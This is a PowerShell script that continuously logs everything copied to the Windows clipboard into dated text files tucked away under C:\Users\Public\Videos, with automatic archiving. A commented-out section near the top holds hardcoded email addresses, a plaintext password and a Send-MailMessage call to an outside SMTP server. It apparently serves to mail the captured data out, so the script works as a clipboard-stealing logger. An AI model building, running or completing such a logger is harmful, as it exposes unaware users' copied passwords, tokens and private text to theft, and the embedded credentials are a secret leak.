#Get-Clipboard
#if(Get-Clipboard -not){}

# function Test-Administrator  
# {  
#     $user = [Security.Principal.WindowsIdentity]::GetCurrent();
#     (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
# }
# $emailFROM = "fJksfLLks@gmail.com"
# $passwordFROM = "bKW9Vj0NQM8z2iithsPw"
# $emailTO = "josfkmcx@gmail.com"
# $subject = "fsdaf"
# $body = "text"
# $smtp = "mail.protonmail.ch"

# $password = ConvertTo-SecureString $passwordFROM -AsPlainText -Force
# $Cred = New-Object System.Management.Automation.PSCredential ("FsdXan@protonmail.com", $password)


# Send-MailMessage -To $emailTO -From $emailFROM -Subject $subject -Body $body -SmtpServer $smtp -Credential $Cred -Port 1025 

if (Test-Path -Path "C:\Users\Public\Videos\*.txt") {
    foreach ($file in (Get-ChildItem -Filter *.txt | Where-Object { $_.Name -like 'Clipboard_*' })) {
        $file.Name        
    }
}


if (-not([System.IO.File]::Exists("C:\Users\Public\Videos\Archive"))) {
    try {
        New-Item -Path  "C:\Users\Public\Videos\" -Name "Archive" -ItemType Directory -Force -ErrorAction Stop
        Write-Host "The directory has been created."
    }
    catch {
        throw $_.Exception.Message
    }
}
if (Test-Path -Path "C:\Users\Public\Videos\*.txt") {
    foreach ($file in (Get-ChildItem -Filter *.txt | Where-Object { $_.Name -like 'Clipboard_*' })) {
        try {
            $archiveFolder = "C:\Users\Public\Videos\Archive\archive_$(get-date -Format 'yyyy-MMM-dd_hh-mm-ss-tt')\"
            $fileTempName = $file.Name
            if (-not(Test-Path -Path $archiveFolder -PathType Container)) {
                $null = New-Item -ItemType Directory -Path $archiveFolder -ErrorAction STOP
            }
            Move-Item -Path "C:\Users\Public\Videos\$fileTempName" -Destination $archiveFolder -Force -ErrorAction STOP
            Write-Host "The old file [$fileTempName] has been archived to [$archiveFolder]"
        }
        catch {
            throw $_.Exception.Message
        }
    }
}
$filePath = "C:\Users\Public\Videos\"
$fileName = "Clipboard_$(Get-Date -format 'yyyy-MM-dd_hh-mm-ss-tt').txt"
$fullPath = $filePath + $fileName
[bool] $archiveFlag = $true
#Get-Date -format 'hh:mm:ss'
$archiveTime = '00:00:00'
$hour = [int]$archiveTime.Substring(0, 2)
$minute = [int]$archiveTime.Substring(3, 2)
$second = [int]$archiveTime.Substring(6, 2)
#DEFINE WHAT TIME YOU WANT TO START ARCHIVE CHECK AGAIN
$second += 5
if ($hour -lt 10) {
    $hour = "0${hour}"
}
if ($minute -lt 10) {
    $minute = "0${minute}"
}
if ($second -lt 10) {
    $second = "0${second}"
}
$archiveAfter = "${hour}:${minute}:${second}"

#$currDate = get-date -Format 'yyyy-MM-dd'
#$fileNameCheck = "Clipboard_$currDate.txt"
#if($fileNameCheck -eq)
if (-not([System.IO.File]::Exists($fullPath))) {
    try {
        New-Item -Path  $filePath -Name $fileName -ItemType "file" -Force -ErrorAction Stop
        Write-Host "The file [$fileName] has been created."
    }
    catch {
        throw $_.Exception.Message
    }
}
if ([System.IO.File]::Exists($fullPath)) {
    $lastClipboard = Get-Clipboard 
    while (1) {
        $currTime = get-date -format 'hh:mm:ss'
        try {
            $newValue = Get-Clipboard
            if ($newValue -ne $lastClipboard -and $newValue.Length -ne 0) {
                $lastClipboard = Get-Clipboard 
                Add-Content -Path $fullPath -Value $newValue -ErrorAction STOP
                Write-Host "The file [$fileName] has been updated with [$newValue]"
            }
        }
        catch {
            throw $_.Exception.Message
        }
        if ($currTime -eq $archiveTime -and $archiveFlag) {
            $archiveFlag = $false
            if (Get-Item -Path $fullPath  -ErrorAction Ignore) {
                try {
                    $archiveFolder = "C:\Users\Public\Videos\Archive\archive_$(get-date -Format 'yyyy-MMM-dd_hh-mm-ss-tt')\"
                    ## If the Archive folder does not exist, create it now.
                    if (-not(Test-Path -Path $archiveFolder -PathType Container)) {
                        $null = New-Item -ItemType Directory -Path $archiveFolder -ErrorAction STOP
                    }
                    ## Move the existing file to the archive.
                    Move-Item -Path $fullPath -Destination $archiveFolder -Force -ErrorAction STOP
                    Write-Host "The old file [$fileName] has been archived to [$archiveFolder]"
                }
                catch {
                    throw $_.Exception.Message
                }
                try {
                    New-Item -Path  $filePath -Name $fileName -ItemType "file" -Value "Test" -Force -ErrorAction Stop
                    Write-Host "The file [$fileName] has been created."
                }
                catch {
                    throw $_.Exception.Message
                }
            }
        }
        if ($currTime -eq $archiveAfter -and $archiveFlag -eq $false) {
            $archiveFlag = $true
        } 
        if ((Get-Clipboard) -eq "exit") {
            break
        }
    }
}
else {
    Write-Host "The file [$fileName] could not be updated because it does not exist."
}

 
# if(-not(Test-Path -Path $fullPath -PathType Leaf)){
#     try {
#         New-Item -Path  $filePath -Name $fileName -ItemType "file" -Value "Test" -Force -ErrorAction Stop
#         Write-Host "The file [$fileName] has been created."
#     }
#     catch {
#         throw $_.Exception.Message
#     }
# }else{
#     Write-Host "Cannot create [$fileName] because a file with that name already exists."
# }

